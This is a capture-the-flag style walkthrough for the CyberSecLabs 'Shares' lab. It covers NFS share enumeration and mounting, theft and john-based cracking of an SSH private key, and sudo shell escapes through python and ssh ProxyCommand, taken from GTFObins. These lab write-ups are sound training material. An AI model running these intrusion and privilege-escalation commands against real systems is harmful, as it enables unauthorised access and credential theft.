# Solving [CyberSecLabs-Shares](https://www.cyberseclabs.co.uk/labs/info/Shares/)
* [Nmap](https://github.com/nmap/nmap) shows many ports are up but noticable are:
    * `21(ftp)`
    * `80(http apache)`
    * `2049(nfs)`
    * `27853(ssh)`
* Port `21` has no anonymoys access, and also `80` leads to nothing
* [showmount](https://linux.die.net/man/8/showmount) shows `/home/amir` can be publicly mounted from the nfs server
```
showmount -e machine_ip
```
* Mounting `/home/amir` locally with `mount -t nfs machine_ip:/home/amir /mnt`
* `amir` dir has contains `id_rsa`, `id_rsa.pub`, and `id_rsa.bak`
* An [ssh](https://www.ssh.com/ssh/) attempt at port `27853` shows it's password encrypted
* Cracking `id_rsa` with [john](https://github.com/openwall/john) gives the password `h*****` (redacted)
```
ssh2john id_rsa > hash
john --wordlist=/path/to/worlist/rockyou.txt hash
```
* SSH login in the machine as user `amir` using cracked password `h*****`
```bash
ssh -i id_rsa -p 27853 amir@machine_ip
```
* `sudo -l` as user `amir` shows `python3` can be run as user `amy` which gives `access.txt`
```python3
sudo python -c 'import os; os.system("/bin/bash")'
```
* `sudo -l` as user `amy` shows `ssh` can be run as `root` which gives us `system.txt`
```
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```
* `priv-esc` commands used above are taken from [GTFObins](https://gtfobins.github.io/)
